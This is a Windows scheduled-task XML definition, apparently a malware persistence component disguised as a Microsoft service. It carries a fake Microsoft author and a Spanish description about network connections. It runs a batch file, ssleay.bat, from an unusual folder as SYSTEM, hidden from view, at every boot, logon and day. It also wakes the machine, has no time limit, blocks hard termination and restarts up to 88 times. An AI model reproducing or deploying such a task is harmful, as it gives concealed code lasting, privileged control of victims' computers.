<?xml version="1.0" encoding="UTF-16"?>

<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">

  <RegistrationInfo>

    <Date>2017-12-06T21:47:23.8284934</Date>

    <Author>TPCOMSFT\microsoft</Author>

    <Description>Ejecuta el servicio de conexiones de red entre equipos</Description>

    <URI>\Microsoft Network Service</URI>

  </RegistrationInfo>

  <Triggers>

    <BootTrigger>

      <Enabled>true</Enabled>

    </BootTrigger>

    <LogonTrigger>

      <Enabled>true</Enabled>

    </LogonTrigger>

    <CalendarTrigger>

      <StartBoundary>2017-12-08T08:15:10</StartBoundary>

      <Enabled>true</Enabled>

      <ScheduleByDay>

        <DaysInterval>1</DaysInterval>

      </ScheduleByDay>

    </CalendarTrigger>

  </Triggers>

  <Principals>

    <Principal id="Author">

      <UserId>S-1-5-18</UserId>

      <RunLevel>HighestAvailable</RunLevel>

    </Principal>

  </Principals>

  <Settings>

    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>

    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>

    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>

    <AllowHardTerminate>false</AllowHardTerminate>

    <StartWhenAvailable>false</StartWhenAvailable>

    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>

    <IdleSettings>

      <StopOnIdleEnd>true</StopOnIdleEnd>

      <RestartOnIdle>false</RestartOnIdle>

    </IdleSettings>

    <AllowStartOnDemand>true</AllowStartOnDemand>

    <Enabled>true</Enabled>

    <Hidden>true</Hidden>

    <RunOnlyIfIdle>false</RunOnlyIfIdle>

    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>

    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>

    <WakeToRun>true</WakeToRun>

    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>

    <Priority>7</Priority>

    <RestartOnFailure>

      <Interval>PT1M</Interval>

      <Count>88</Count>

    </RestartOnFailure>

  </Settings>

  <Actions Context="Author">

    <Exec>

      <Command>"C:\Microsoft Network Service\ssleay.bat"</Command>

    </Exec>

  </Actions>

</Task>